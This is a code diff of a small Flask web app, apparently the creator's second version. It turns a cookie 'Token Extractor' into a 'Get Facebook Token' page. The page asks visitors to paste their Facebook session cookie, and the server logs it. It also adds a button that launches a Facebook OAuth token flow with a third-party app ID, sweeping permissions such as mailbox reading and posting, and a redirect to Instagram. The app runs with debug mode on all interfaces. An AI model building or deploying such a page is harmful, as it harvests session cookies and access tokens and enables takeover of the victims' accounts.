@@ -2,163 +2,124 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# HTML content for the webpage
+# HTML Content
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Access Token</title>
+    <title>Get Facebook Token</title>
     <style>
         body {
-             font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #f953c6, #b91d73);
-            color: #fff;
-            margin: 0;
-            padding: 20px;
-        }
-
-        @keyframes gradient {
-            0%, 100% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #4A148C;
-        }
-
-        form {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        textarea {
+        .container {
+            background: white;
+            width: 400px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        textarea, input {
             width: 100%;
-            height: 100px;
             padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
             border: 1px solid #ddd;
-            border-radius: 8px;
-            margin-top: 5px;
-            box-sizing: border-box;
-            font-size: 1em;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .output {
+            margin-top: 20px;
+            font-size: 16px;
             color: #333;
         }
-
-        textarea:focus {
-            border-color: #8E24AA;
-            outline: none;
-        }
-
-        button {
-            background: linear-gradient(to right, #f953c6, #b91d73);
+        .copy-button {
+            margin-top: 10px;
+            padding: 5px 10px;
+            font-size: 14px;
+            background-color: #007bff;
             color: white;
-            padding: 10px 15px;
             border: none;
-            border-radius: 8px;
             cursor: pointer;
-            margin-top: 15px;
-            width: 100%;
-            font-size: 1.2em;
-            transition: transform 0.3s;
+            border-radius: 5px;
         }
-
-        button:hover {
-             background: linear-gradient(to right, #b91d73, #f953c6);
-            transform: scale(1.05);
+        .copy-button:hover {
+            background-color: #0056b3;
         }
-
-        pre {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-            padding: 10px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-size: 1em;
-        }
-
-        h2 {
+        .connect-button {
             margin-top: 20px;
-            font-size: 1.5em;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #17a2b8;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
         }
-
-        .response-container {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-           box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-            border-left: 5px solid #F50057;
-            border-radius: 8px;
-            font-family: monospace;
-            word-break: break-word;
-            white-space: pre-wrap;
-            text-align: left;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .no-response {
-            margin-top: 20px;
-            color: #f2ebeb;
-            font-style: monospace;
+        .connect-button:hover {
+            background-color: #138496;
         }
     </style>
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert("Token copied to clipboard!");
+            }, function(err) {
+                alert("Failed to copy token: " + err);
+            });
+        }
+    </script>
 </head>
 <body>
     <div class="container">
-        <h1>Token Extractor | 2.0</h1>
-        <form method="POST">
-            <textarea name="cookies" placeholder="Paste Your JSON Cookie Here" required></textarea>
+        <h1>Get Facebook Token</h1>
+        <p>Enter your Facebook cookie below:</p>
+        <form method="post">
+            <textarea name="cookie" rows="5" placeholder="Enter your Facebook cookie here..."></textarea><br>
             <button type="submit">Get Token</button>
         </form>
         
-        {% if token %}
-            <div class="response-container">
-                <strong>Extracted Token:</strong>
-                <pre>{{ token }}</pre>
-            </div>
-        {% endif %}
-        
-        <div class="no-response">Created by Shahzaib Khanzada | Post & Convo | Token Extractor | 2.0</div>
+        <a href="https://www.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,pages_messaging,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https://www.instagram.com/" target="_blank">
+            <button type="button" class="connect-button">Connect Instagram</button>
+        </a>
     </div>
 </body>
 </html>
 """
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route("/", methods=["GET", "POST"])
 def index():
-    token = None
-    if request.method == 'POST':
-        try:
-            # Parse the JSON cookie input
-            json_cookie = request.form['cookies']
-            # Extract "c_user" and "fr" tokens as an example
-            extracted_data = {}
-            for line in json_cookie.splitlines():
-                if ':' in line:
-                    key, value = line.split(':', 1)
-                    extracted_data[key.strip()] = value.strip().strip(",").strip('"')
-            token = extracted_data.get("c_user", "No c_user found")
-        except Exception as e:
-            token = f"Error parsing cookies: {str(e)}"
+    if request.method == "POST":
+        # Retrieve the cookie from the form
+        fb_cookie = request.form.get("cookie", "")
+        
+        # Placeholder for processing the cookie (replace with your logic)
+        print("Received Cookie:", fb_cookie)
+        
+        return render_template_string(HTML_PAGE)
+    
+    return render_template_string(HTML_PAGE)
 
-    return render_template_string(HTML_PAGE, token=token)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
     
